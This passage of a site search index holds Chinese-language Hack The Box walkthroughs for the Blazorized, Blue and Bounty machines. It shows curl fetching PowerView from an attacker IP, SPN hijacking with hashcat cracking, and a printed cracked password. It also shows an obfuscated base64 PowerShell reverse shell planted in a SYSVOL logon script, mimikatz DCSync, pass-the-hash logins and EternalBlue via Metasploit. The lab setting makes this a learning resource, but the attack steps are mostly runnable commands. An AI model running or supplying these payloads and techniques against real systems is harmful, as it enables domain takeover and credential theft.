<p>BloodHound\u901a\u8fc7\u5728\u57df\u5185\u5bfc\u51fa\u76f8\u5173\u4fe1\u606f\uff0c\u5728\u5c06\u6570\u636e\u6536\u96c6\u540e\uff0c\u5c06\u5176\u5bfc\u5165Neo4j\u6570\u636e\u5e93\u4e2d\uff0c\u8fdb\u884c\u5c55\u793a\u5206\u6790\u3002Neo4j\u662f\u4e00\u6b3eNOSQL\u56fe\u5f62\u6570\u636e\u5e93\uff0c\u5b83\u5c06\u7ed3\u6784\u5316\u6570\u636e\u5b58\u50a8\u5728\u7f51\u7edc\u4e0a\u800c\u4e0d\u662f\u8868\u4e2d\uff0cBloodhound\u6b63\u662f\u5229\u7528\u8fd9\u79cd\u7279\u6027\u52a0\u4ee5\u5408\u7406\u5206\u6790\uff0c\u53ef\u4ee5\u66f4\u52a0\u76f4\u89c2\u7684\u5c06\u6570\u636e\u4ee5\u8282\u70b9\u7a7a\u95f4\u201d\u6765\u8868\u8fbe\u76f8\u5173\u6570\u636e\u3002</p> <p>\u64cd\u4f5c\u6b65\u9aa4\uff1ahttps://www.freebuf.com/articles/web/288370.html</p> <p>\u901a\u8fc7curl\u547d\u4ee4\u8fdc\u7a0b\u4e0b\u8f7dsharphound.exe</p> <p></p> <p>\u8fd0\u884csharphound.exe</p> <p></p> <p>\u8fd0\u884c\u7ed3\u679c\uff1a\u4ea7\u751fBloodHound.zip\u6587\u4ef6\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u52a0\u8f7d\u5230BloodHound\u670d\u52a1\u4e2d\u53bb\u3002</p> <pre><code>C:\\Users\\Public&gt;dir\ndir\n Volume in drive C has no label.\n Volume Serial Number is 9756-87FD\n\n Directory of C:\\Users\\Public\n\n07/31/2024  04:51 PM    &lt;DIR&gt;          .\n07/31/2024  04:51 PM    &lt;DIR&gt;          ..\n07/31/2024  04:51 PM            12,360 20240731165141_BloodHound.zip\n10/06/2021  03:38 PM    &lt;DIR&gt;          Documents\n09/15/2018  02:19 AM    &lt;DIR&gt;          Downloads\n09/15/2018  02:19 AM    &lt;DIR&gt;          Music\n09/15/2018  02:19 AM    &lt;DIR&gt;          Pictures\n07/31/2024  04:50 PM         1,046,528 qwe.exe\n09/15/2018  02:19 AM    &lt;DIR&gt;          Videos\n07/31/2024  04:51 PM            10,667 ZWY3N2UxMzgtNTg0Zi00OTg1LTllNmQtMDg1Yjc5ZmYzNWMz.bin\n               3 File(s)      1,069,555 bytes\n               7 Dir(s)   6,110,216,192 bytes free\n</code></pre> <p>\u4e0b\u8f7dBloodHound.zip\u6587\u4ef6\u5230\u672c\u5730</p> <p></p> <p></p> <p>\u67e5\u770b\u57df\u5185\u4fe1\u606f</p> <p></p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#powerviewps1","title":"PowerView.ps1","text":"<p>\u8fd9\u91cc\u4e0d\u80fd\u5728meterpreter\u4e0b\u4f7f\u7528upload\uff0c\u539f\u56e0\u662f\u6743\u9650\u4e0d\u591f\uff0c\u53ea\u80fdshell\u8fdb\u53bb\u4f7f\u7528curl\u547d\u4ee4\u4e0b\u8f7d</p> <pre><code>C:\\Users\\Public&gt;curl -o 123.ps1 http://10.10.16.5:8888/powerview.ps1\ncurl -o 3.ps1 http://10.10.16.5:8888/powerview.ps1\n</code></pre> <p></p> <p>\u4ee5powershell\u73af\u5883\u6267\u884cps1</p> <pre><code>Import-Module ./123.ps1\n</code></pre> <p></p> <p></p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#spn","title":"SPN\u52ab\u6301","text":"<p>\u6267\u884c\u547d\u4ee4</p> <pre><code>Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='test/test'}\nGet-DomainSPNTicket -SPN test/test\n</code></pre> <p>\u83b7\u53d6\u8bf7\u6c42\u670d\u52a1\u7968\u636e </p> <p></p> <p>\u590d\u5236\u4e0b\u6765\u653e\u5728hashcat\u8fdb\u884c\u89e3\u5bc6</p> <pre><code>hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -o found.txt --force\n</code></pre> <p></p> <pre><code>password: (Ni7856Do9854Ki05Ng0005 #)\n\u5bc6\u7801\uff1a (Ni7856Do9854Ki05Ng0005 #)\n</code></pre>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#rsa_4810","title":"RSA_4810","text":"<p>\u4f7f\u7528evil-winrm\u4f5c\u4e3aRSA_4810\u767b\u5f55\uff1a</p> <pre><code>sudo evil-winrm -i blazorized.htb -p '(Ni7856Do9854Ki05Ng0005 #)' -u RSA_4810\n</code></pre> <p></p> <p>\u8fdb\u5165\u540e\u7ee7\u7eed\u4e0a\u4f20PowerView.ps1\u901a\u8fc7Get-NetUser\u67e5\u770b\u4fe1\u606f</p> <pre><code>*Evil-WinRM* PS C:\\Users\\RSA_4810\\Documents&gt; upload powerview.ps1\n</code></pre> <p></p> <p></p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#ssa_6010","title":"SSA_6010","text":"<p>\u901a\u8fc7Get-NetUser\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\u8fc7\u540e\uff0c\u6211\u4eec\u53d1\u73b0\u5176\u4ed6\u7528\u6237\u7684logoncount\u4e3a 0\uff0c\u7528\u6237SSA_6010\u767b\u5f55\u8ba1\u6570\u4e3a 4079\u3002</p> <p>LogonCount \u662f\u767b\u5f55\u8ba1\u6570\uff0c\u662fActive Directory (AD)\u73af\u5883\u4e2d\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u7684\u4e00\u90e8\u5206\u7684\u5c5e\u6027\u3002</p> <p></p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#_4","title":"\u6839\u636e\u8def\u5f84\u5bfb\u627e\u53ef\u6267\u884c\u6743\u9650","text":"<p>\u6211\u4eec\u5728SYSVOL\u4e2d\u7684A32FF3AEAA23\u76ee\u5f55\u4e0b\u6709\u5199\u6743\u9650\u3002</p> <pre><code>icacls A32FF3AEAA23\n</code></pre> <p></p> <pre><code>'powershell -e JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACIASAA0AHMASQBBAEEAQQBBAEEAQQBBAEEAQQBLADEAVwBhADMATwBpAFMAaAByACsAbgBQAHcASwBQAHEAUgBLAHIAUgBpAGoAZQBFAHYATwBWAHEAbwBPAEsAaQBpAEsAcQBLAEEAbwA1AHEAUgBTAEwAYgBRAEsATgByAGUAbQBRAGYARABzAC8AUABkAHQAVQBEAE8AWgBuAGMAegB1AFYATwAxAGEAWgBkAEUATgA3ACsAWABwADUANwAzADAAcQAwAEwAeQBvAEIASgBzAEcAVwBUAHMAbQBaAEIANQAwAEMAQQBPAEwAYwA5AGwAMgBOAHYAYgBiAGUAUQBhAEoARgB0AG4AaQAvAGMAZABKAE8AOAArADkAbwB4ADMAWQBKAG8AWQBoAGkASAB6ADkAKwAzAE4ARgBHAEQAZwBNAE0AVwA3AEcATwBCADMAeAB6AE0AagBCAE0AdABNAHYAcwBrAEUAbwBSAGwAaABXAEwAcQA1AHUAYgAzAEoAWAAwAFYAdQBDAEwAYgB3ADMAUQBYAEUAaQB1AEcANwBBADgAbgBlAE0AMABQAG0AaABTAG0AKwBjAHIANwBmADgAeAB4AGcAdQBXADkALwAvAE4ARwBOAE0ASQBZAHUATwBlADgAcgBmAFUAaQA0AE0ASQBUAE8AQgBsAGsAdwBMAEoAYQBZAGYAegBMAEwAUABjAFQAdwBZAGIASwB4AG8AVQBHAFkAdgA1AG0ANwA5ADAAbwBmAGUAUgB1AEEATABtAEoAcABGAHgAaAA3AGUAZwByAE8ATgBiAE4AdgBrAG0AZQBBADcAQQBRAFYAMQBVAGMAVwBLAFIAYgArACsAcQB0AFEAZQBuADIAbwB2AFYAWAA0AEkAQQBJAG8ATABCAGIAVQBOAEMAVABRAHEAWgBnAEkARgBVAHIATQB0ADEATABtAGMASgA3ADYAcwBGAGcAWQBXAHcAYgAyAFEAbQA5AEwASwBrAHYATAByAGIATwBWAFIAWQA1AGUAegBzAEcAUAB6ADkAZwBMAHAAYwB2AEoAZABqADYAZwA1AC8AagAxAEkAVABPAHIAWgA1ADEAaQBnAFMANgBuAGwAQgB2AHUAegBHAEcAaAB6AEwAeABtAC8AbAA3AGYAMwBwAGcALwBQADkAQQBvAGsAVQBzAHMAQgAxAFoARQBsADAARABzACsAUwByAEUAcwBXAFgAQQBzAEQASQBBAHIAbwBtAGcAQQByAGQAVQByAFIARABTAG0ATABtADcAUQBvAG0AQwB3AEoAQgBFADIARwBXAHUAVwBLAGgAZQA3AEIAMQBnADgAYwA2AE4ARQBDAHAAVAB1ADYAKwAvAGEALwBlAHQASwBNAFAAagBsAGQAegBmAFYAUwBwACsAVgBxAEoAUwBVADQASgBMADUAVQB0AE8ALwBBADQAZAA0AHoAeAB2AHoAdQBiAG8AYwBYADUAQwAvAHkAbQA1AFMAdgBUADMAVQA0AEsAVgBiAHIAOQA5AGwAYQBvAG0AUgBIAEEASABDAEgAdwBuAGwATgA5AFAAdQBYAHAANwBjAC8ATwBhAEwAeQBFADkAVAAzAEgAcQBoAFYAYQB1ADkAOABKAFUAeQA4AHkAWQBnAGcARABFAHcAMgBrAFcAegBqAG0ATwBZAE8AbgB0AGUAMwB6AE8AYgBxACsAYQBZAGYAbQBYAGgAbQBwAFgAcgBZAHYATwBPAFQAeABuAEgAQwAvAE0AcQArAFoAWgA1AHQAdgB0AFQAZQBuADIAawBqADMAWgArAC8AZABOAFoAQwBFAFQANAB1AHoANwByADYAdQBoAEIANwBlAFcAQwAzAHUAcABDAHgAegBMAHUAQwBaADgAOABhAHUAWQB3AFMAMgBDAE8AUgArAFYAcQA1AGgATQBjAFIAWQBMAGwAdwAvAFEANwBGADMAWQBLAFcAUwBFAHYAdgA2AHMAeABqAHMAVwArAGQARAB0AG4ATQBGAHgAQgBvADEANwBTAEYASABSAGwAQwBqADkAQwBPAFkAYwB3ADIASgBCAGQATQBmAFEAbwBmAHkAZAA5AHoAUgBOADcANwBhADAAegBPAEIAVgArAGwASgBhADYAZABWADcAdABzADkAeQB1AFkAdABBAEcASgBhAFoAYQBVAFQAcgAzAEMAZwB6AEsAZwBRAEkAbQBtAFcARwBjADAAUAByADgAbwBtAEwAaQBKAGMAdgBDADkALwBoAGoAaQBOAEUATABBAE8ARQA1AEcAcgB1AHIAZgBRAEYAcABSAGYAWABYAGMAKwBsAEYAUgBNAFoATgBMAHEAVQBoAHIAbgBxAFEAOABNAEMASwBHAE8AbAB6AEEAdwBzAEUAMwBaAFMAMQBkAHAAZABJAFIAUwArADUASwBRAEwARQBLAEkAbABSAHkAMwBGAE4AQwBiADAAVABjAGEARgBTAHIASwBjAHcAVwBiADUAMwAvAE8AagBWAEYARQBoAEUAUgAwAGYAUQBZAGQASwA1ADEAMQBJAFEARwBCAEgAZQA4ADYAbABvAHYASgAwAEEAegB0AG8ARgB2ADQARAA3AEcAdQBkAG4ASQBzAGkANAArAHAASwAwAGkAZgBRAE4AQQBGAFUANQBKAEUAeQBvADEAbQBZADAATAA1AFcASwBQACsAVQBlAFAAOABiAHYAQgA5AGIAegBBADgAdwB1AHgAaABlAEEAbABuAE0AQwAxAEgAYwAwAG8AWgArADcAZwBLAFUAbgBkAEEANgAwAFcAWQBNAEEAKwBhAHAAbABKAFgAZwBhAHkAYwBsAFcAUwAzAGwAWgBvAHoAcwB1AG4AbgA1AEkARABxAG4ARgBSAE8AcQBKAEcARABQADYAWQBBAFEAdABoAHAAcQAzAHUATwBLAGgAVABvAGIANwBaAEwAbgBxAGQAUgBLAHgANwBiAEkARABsAFAAZABsAFIAUABEADEAVABBAGYAQwAzADMAUQAyAGkAYwB6AE4AdgBLAE0ATwBjAEgAQgBnAE8ALwBSAHYAVwBLAHcAWQBZAGoANgB5AE4ALwBzAHAAUQBBAGsAawBtADAAbgB6ADkAMQBWAHkAawA4ADUAVgByAEoAYQBWAHQATQBTAEkANgBsAHoAYwBnAFgATABjAEsAagBlAGIATwBMAHAAeQBqAE0AVwBZADEAbgB3AFUATgBnAGUAZABZAFgAbABBAGwAaAAyAGsAUAB1AEsAbgBFAGIATgA1AEUARQBxAG4AWQB6AFcASABrADkAWQA2AE8AbABIAE8AUgBEAGoASwBXAGMAdQBZADYAUABsAGoARAB5AGgAUgBhAGkAdQBGAHYARwBSAGoALwBsAG8ATQB0AFUAagBLAFoAQQBjADAAVwByAHMANAA1ADUARwBoAHIASABZAGYAeABxAE0AVwBCADAAOABvAFUAMABiADUAdgBwAG0AawBQAG4AUwBnADEAMABNAHMAdgAzAHAATwBkAHQAYgBRAFIAZgBpAHoASQA5AE8AMgBZAGYAMQBXAGcAcwB1AGgAMgAzAGQAOQBTADIANABqAEgAYQBuAG8AMgB3AFoANQBxAGsASAAyAFMARgA5AEgAMwBsAGoAdwB3AC8AcgA4AHMAbgBZAEgAZwA0ADIAOABHAHMATAA5AFYAQQBiAHoAUgBmAHIARgBlAFcAbQBCAGcASQBzAGIARgBwAFkAMQBYADAAVQBhADkAegBpAFUASgArAHUAYwBZADQAdABGAGkAaABHAE8AYwBOAHAARwBlAHoAdwBwAFAAdQBIAHQAYQBrAEYAZgBIADIANgBFAFIAYwBEAGgASQBOAG8AYQBEAG0AUAB2AEMAdQBtAEYAeABsAG4AbQBLAHAAcQBoAHoANQBIAGEAMwBNAFUAUABEAFgATgBFADUAcwBPAC8AQQBaAG8AWQBZAHQAeQBtAGwAQQAvADcAWQB4AGYAWQB4AEgAYQA0AG4ATABpAEcAaQB2AEIAYwBvAHcAOQAyADEATgBzADQAOQBtAEoAZwBpAGIARgAzAFIAagBJAHcAOQBFAHEAdwBRAEUAWgA0AGkAQgBHAFEAWABNAHkATgBUAEwAYwB1AFYANABtAFAAMgB1AGcAUwBZADMASwBCAHgAdABiAEcAbwBGADcAMABSAHIAYgA0AFAAawBVAFMAaQBNAFkAWgArAHQAMAAyAGgAcwBsAHEAVwBpAEwAVAAxAEUAbgAwACsAdgAxAEUAMAA5AHoAcQByAGIAQQBkAHIAcABQADYAcgBJADEAWQB1AGMAawBuAGcAdABzAFUAdwBpADEAbgBZADYANwBmAE4AUQBNADEANwBOADcAdQBDAEwAcgB6AGsAUgBTAEUAcAAyAHIARAB3AE4AbAAxAGsAYgAxAEcAUQBmAG0AQQBRAHYARwBDADMANABvAG0AZAAyADIAdABFAEwAcQBDAEsAUQBEAFUAMQBNAFMAWgAwADIAVwB4ADgAZgBZAGQAeQBlAGsAcQBzAEQAcQBVAEcAcQAwAFoAVQB0AG0ARgAvAHgAYQA2AFQAbABEAFgAagBuAFUAVgB2ADIAWgBIAE0AMABGAE4ASgBwAFgAbgA3AHUAOQBqAGkANwB6AHgANwBFADAANAA1AFAASgBvAGoAcABjAHEAUQBkAGgAcQB1AHgAMwB2AFkAMwBiAEMAZABhADcAcwBjAG8AZgBxAC8ATQArAEoAMQBkAHAAVABBAFoAegBRAFoAbAB4AGIASwAzAE8ASgBRAHUAWgBWADMAWQA5AGsALwBkAGwAUQBUAEYAMAByAGgAWgBxAFEAawBMADMATgBXAEcAawBWAE4AZQB5AGQAagB4AHEAUABXAFcAcwBjACsAeABRAG0AMQBGAC8ASABDAHMAbwBtAGEANgBDACsASgBGAGsASABXAHgATwBQAHcAcQB4ADAAMQBjAGIAMwBzADUAVgBJAE4AYgBhADkANgB4ADkAbgBLADUANQByADIAMgB1AEgANwBuAEYAUQBPAEYAVwA4AFEAawA0AFQAeABNAFYAZABsAGkAMQByAGgAMgBmADEAawBqAGUAbQB0AHQAVgAxAFUANwBhADkAdwBoAEwAOQBmAFoAMABZAE4AdQArAE4ARgA0AG0AcgBlAEgAMgBsAEQAeQBLADQAMQBsAEQANQBNADIAQgBwAGwAawA3AFIAOQBYAG4AagA3AGcAOQByAEwAdgBkADEARgAxAHcAegAyADEAaAB0AEwAQQBGAC8AZABoAFkAcgArAEIASQBIAEcANABHAHYATgA4AGEATABQAGsASQBzAHgAQwByAHkAZgBEAGcARABsAGkALwBxAFoAbABSAGkANQBwAE8AcAByAEgAVABmAEQASgBxAHkAbgBvAFcAaQB2ADEAawBPADIAdwBTAFQAdABrAFMAcQBhAHEAcgAyAGcARwBEADcAbgAwAC8AWgBNAFgAYQBvAHQAZAByAFQASgA0AEQAYgBrAHoAdQBuAFcAaQBvAHQANgBMAHEAeQBoADQAQQB0AGIAKwAwAHEAcwBjAFkAMgBvAGYAbQAwACsATgA2AFYAZQAzAGcAWQAzADMASwAxAHgAeQBMAHgAWABKAGIAVABkAFoAKwBZADEAdQBYAHAANwBDAEoAbgBWAFcAMQA1ADYAYQBOAGgAcQAzADcAOQBUAG4AeQBoAE4AbwA1AHAANABNADEAegBWAFYAYQBvADYATwBOAGUATQBwAHEAZABRAFQAMAB2AEcAWgBIAGEAOQBnAHcAagB3AGsANQBzAGEARABkAE8AUgByADkASwBFAGoAbwB2ADAAcAB6ADgAbgA1AEoAWgBZACsAWgBUAEIAQwB3AE4ASwAvAEgAbQAyAFYAdwBwAEgAawBOAFcAagAyAFgAYQAyADEAcwByAGEAawBKAFEAVgBmAEIAWQB0AFMAbABkAGIAKwBwAHcAagBwAHAAZwAxAFMAMwBSAFcAcgBYAHUATwA5AEoAcwBkAHcAMgA2AGgAMQB4ADMAbABQAHkAUAA0ADIAWgBiAG8AOABWAHMANwBZADgAdgByAHoAawBiAFgATAByAFkAVAByADUASgBOAGsAMAA4AFEAKwBHAFAAaAA4AFEAWQBUADYAYQBIAFcAMQB4AHQATABWAG0ANwArAC8AdgA4ADMAWgA0ADgALwBIAHAAOQBTADUANQB1ADQANgBRAEgALwB1AEgAVABVAEwATgAxAFoAdQAzAE4AOQArAHUAcwAwAEkATQBQAG4AWABNAFgAMAAxAG0AWQA0AEQARABQAFUAQwAwAGsAOQBMAHAANgBuAG8AMwBDAGgANABXAEwAagBQAFMAMQBMAE0AeQBqAFcATAB4ADYANwBIACsAQQBMAEUATABFAFIAMQA1ADYAVgBCADgAdgBWAEUANABoAEQAdwBqAG0AKwBwACsATQBWADcAOQArAGQASAB6ADYAYwAyADUAbwBNAHMANgArACsAVwBxADkAUAAxAHkASwBKAFcAdQAxADkANABtADIAbQA3AHoAMABlAGQAeQB4AE8AcwBFACsAUAAwAGEAVwBkAFAAegBsAFQAOABSAEsAVQBGADMAUgAvAFoAbABwAHAAcgBVAHEAOQBWAHEAOQBtAHgAVQBxAGIAWABmAEoANgBiAHIAKwBXAG4AeAB3ADEANAA1AG0ALwAwACsAUQBmAG4AcwBDAHUAVwB1AFAAbwBZADEASABMAGsATwAvAEQALwBHADQAQQBlAHYALwA1ADMAZABqAEwAOQA4AGYAdgB6AE8AWABvADcAbwBhADgAcQB5AEMALwBsAGYAYwBMAEIAdQA1AGQAOABOAEEAQQBBAD0AIgApACkAOwBJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFIAZQBhAGQAZQByACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAkAHMALABbAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAOwA=' | Out-File -FilePath C:\\windows\\SYSVOL\\sysvol\\blazorized.htb\\scripts\\A32FF3AEAA23\\revshell.bat -Encoding ASCII\nSet-ADUser -Identity SSA_6010 -ScriptPath 'A32FF3AEAA23\\revshell.bat'\n</code></pre>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#shell","title":"\u53cd\u5f39shell","text":""},{"location":"CTF/HTB/Windows-Blazorized/index.html#shellmsf","title":"\u4e0a\u4f20shell\u6587\u4ef6\u53cd\u5f39\u5230msf\u8fdb\u884c\u64cd\u4f5c","text":""},{"location":"CTF/HTB/Windows-Blazorized/index.html#dcsync-mimikatz-x64","title":"DCSync\u6743\u9650--&gt;mimikatz x64","text":"<p>shell\u8fdb\u5165\uff0c\u542f\u52a8mimikatz.exe</p>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#hash","title":"\u83b7\u53d6hash","text":"<pre><code>lsadump::dcsync /domain:blazorized.htb /user:Administrator\n</code></pre>"},{"location":"CTF/HTB/Windows-Blazorized/index.html#ntmladministrator","title":"ntml\u767b\u5f55\u4e3aadministrator","text":"<pre><code>sudo evil-winrm -i blazorized.htb -H 'f55ed1465179ba374ec1cad05b34a5f3' -u Administrator\n</code></pre>"},{"location":"CTF/HTB/Windows-Blue/index.html","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Windows-Blue/index.html#namp","title":"Namp","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.40 -oA scans/ports\n...\nPORT      STATE    SERVICE\n135/tcp   open     msrpc\n139/tcp   open     netbios-ssn\n445/tcp   open     microsoft-ds\n49152/tcp open     unknown\n49153/tcp open     unknown\n49154/tcp open     unknown\n49155/tcp open     unknown\n49156/tcp open     unknown\n49157/tcp open     unknown\n...\nroot@kali# nmap -sT -sC -sV -O -p135,139,445 10.10.10.11 -oA scans/details\n...\nPORT    STATE SERVICE      VERSION\n135/tcp open  msrpc        Microsoft Windows RPC\n139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\nService Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: -17m06s, deviation: 34m38s, median: 2m53s\n| smb-os-discovery: \n|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)\n|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional\n|   Computer name: haris-PC\n|   NetBIOS computer name: HARIS-PC\\x00\n|   Workgroup: WORKGROUP\\x00\n|_  System time: 2021-05-04T02:04:49+01:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2021-05-04T01:04:52\n|_  start_date: 2021-05-04T00:54:47\n...\n</code></pre> <p>\u6839\u636e\u5f00\u653e\u7aef\u53e3\u7684\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u786e\u5b9a\u76ee\u6807\u7cfb\u7edf\u662fwin7\uff0c\u5e76\u4e14\u7a81\u7834\u70b9\u5728smb\u670d\u52a1\u4e0a\u9762\u3002</p> <p></p> <p>win7\u6709\u4e2a\u975e\u5e38\u51fa\u540d\u7684\u6f0f\u6d1e\u53eb\u201c\u6c38\u6052\u4e4b\u84dd\u201d\uff0c\u518d\u8054\u60f3\u5230\u8be5\u9776\u673a\u7684\u540d\u5b57\u201cblue\u201d\uff0c\u731c\u6d4b\u53ef\u80fd\u9700\u8981\u5229\u7528\u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\u3002\u4e0d\u8fc7\u6211\u4eec\u5148\u6309\u7167\u6d41\u7a0b\u63a2\u7d22\u4e00\u4e0bsmb\u670d\u52a1\u3002</p>"},{"location":"CTF/HTB/Windows-Blue/index.html#_2","title":"\u6f0f\u6d1e\u5229\u7528","text":""},{"location":"CTF/HTB/Windows-Blue/index.html#smb","title":"SMB","text":"<p>\u53d1\u73b0 SMB \u53ef\u7528\u65f6\uff0c\u9996\u5148\u8981\u6267\u884c\u7684\u64cd\u4f5c\u4e4b\u4e00\u662f\u679a\u4e3e SMB \u5171\u4eab\u3002<code>smbmap</code></p> <pre><code>root@kali# smbmap -H 10.10.10.40\n[+] IP: 10.10.10.40:445 Name: 10.10.10.40                                       \nroot@kali# smbmap -H 10.10.10.40 -u guest\n[+] Guest session       IP: 10.10.10.40:445     Name: 10.10.10.40                                       \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        ADMIN$                                                  NO ACCESS       Remote Admin\n        C$                                                      NO ACCESS       Default share\n        IPC$                                                    NO ACCESS       Remote IPC\n        Share                                                   READ ONLY\n        Users                                                   READ ONLY\n</code></pre> <p>Share\u4e3a\u7a7a\uff1a</p> <pre><code>root@kali#  smbclient //10.10.10.40/share\nEnter WORKGROUP\\oxdf's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Fri Jul 14 09:48:44 2017\n  ..                                  D        0  Fri Jul 14 09:48:44 2017\n\n                8362495 blocks of size 4096. 4259398 blocks available\n</code></pre> <p>Users\u53ea\u6709\u7a7a\u548c\u6587\u4ef6\u5939\uff1aDefaultPublic</p> <pre><code>root@kali#  smbclient //10.10.10.40/users\nEnter WORKGROUP\\oxdf's password: \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                  DR        0  Fri Jul 21 02:56:23 2017\n  ..                                 DR        0  Fri Jul 21 02:56:23 2017\n  Default                           DHR        0  Tue Jul 14 03:07:31 2009\n  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009\n  Public                             DR        0  Tue Apr 12 03:51:29 2011\n\n                8362495 blocks of size 4096. 4259398 blocks available\nsmb: \\&gt; ls default\n  Default                           DHR        0  Tue Jul 14 03:07:31 2009\n\n                8362495 blocks of size 4096. 4259398 blocks available\nsmb: \\&gt; ls public\n  Public                             DR        0  Tue Apr 12 03:51:29 2011\n\n                8362495 blocks of size 4096. 4259398 blocks available\n</code></pre>"},{"location":"CTF/HTB/Windows-Blue/index.html#ms17-010","title":"MS17-010 \u5229\u7528","text":"<p>\u4f7f\u7528msf\u81ea\u5e26\u7684exp\u6765\u5229\u7528\u6c38\u6052\u4e4b\u84dd\uff1a</p> <pre><code>msfconsole\n\nmsf6 &gt; search ms17-010\n</code></pre> <p></p> <pre><code>msf6 &gt; use 0      //\u9009\u62e9\u5bf9\u5e94\u6a21\u5757\u7f16\u53f7\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40 //\u8bbe\u7f6e\u76ee\u6807ip\nRHOSTS =&gt; 10.10.10.40\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.6  //\u653b\u51fb\u673aip\nLHOST =&gt; 10.10.14.6\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run\n</code></pre> <p></p> <p>\u7b49\u5f85\u7247\u523b\uff0cmsf\u5373\u53ef\u6210\u529f\u5229\u7528\u6f0f\u6d1e\u3002</p> <p></p>"},{"location":"CTF/HTB/Windows-Bounty/index.html","title":"\u4fe1\u606f\u6536\u96c6","text":""},{"location":"CTF/HTB/Windows-Bounty/index.html#namp","title":"Namp","text":"<pre><code>root@kali# nmap --min-rate 10000 -p- -Pn 10.10.10.93 -oA scans/ports\n...\nPORT   STATE SERVICE\n80/tcp open  http\n...\nroot@kali# nmap -sT -sC -sV -O -p80 10.10.10.93 -oA scans/details\n...\nPORT   STATE SERVICE VERSION\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Bounty\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n..\n</code></pre>"},{"location":"CTF/HTB/Windows-Bounty/index.html#fuzz","title":"\u76ee\u5f55FUZZ","text":"<p>\u6839\u636eMicrosoft IIS httpd 7.5\u77e5\u9053\u8fd9\u662fwindows server 2008 R2\u7cfb\u7edf\uff0c\u4e00\u822c\u90fd\u5b58\u5728aspx\u52a8\u6001\u7f51\u9875\u6587\u4ef6\u2026\u53d1\u73b0\u4e86tranfer.aspx</p> <p></p> <pre><code>root@kali# gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx                    \n...\n/transfer.aspx        (Status: 200)\n/aspnet_client        (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/aspnet_client/]\n/uploadedfiles        (Status: 301) [Size: 156] [--&gt; http://10.10.10.93/uploadedfiles/]\n...\n</code></pre>"},{"location":"CTF/HTB/Windows-Bounty/index.html#web","title":"WEB\u670d\u52a1","text":"<p>\u67e5\u770b\u524d\u7aef\u6e90\u7801\u6ca1\u53d1\u73b0\u4ec0\u4e48\u2026</p>"},{"location":"CTF/HTB/Windows-Bounty/index.html#tranferaspx","title":"tranfer.aspx\uff1a","text":"<p><code>transfer.aspx</code>\u662f\u4e00\u4e2a\u6587\u4ef6\u4e0a\u4f20\u9875\u9762,\u6240\u6709\u6210\u529f\u4e0a\u4f20\u7684\u6587\u4ef6\u90fd\u4f1a\u5230<code>uploadedfiles</code>\u4e0b\uff0c\u4e0d\u8fc7\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u8fc7\u4e00\u6bb5\u65f6\u95f4\uff08\u51e0\u5341\u79d2\uff09\u5c31\u4f1a\u88ab\u5220\u9664.</p> <p></p> <p>\u4f7f\u7528BP\uff0c\u622a\u65ad\u4e0a\u4f20\u9875\u9762\u4fe1\u606f\uff0c\u4f7f\u7528intruder\uff0c\u7206\u7834\u6269\u5c55\u540d\uff0c\u53d1\u73b0\u5141\u8bb8\u4e0a\u4f20\u7684\u6269\u5c55\u540d\u5305\u62ec:gif,jpg,png,config\u3002</p> <p>\u5728\u8c37\u6b4c\u4e0a\u641c\u7d22IIS httpd 7.5 upload 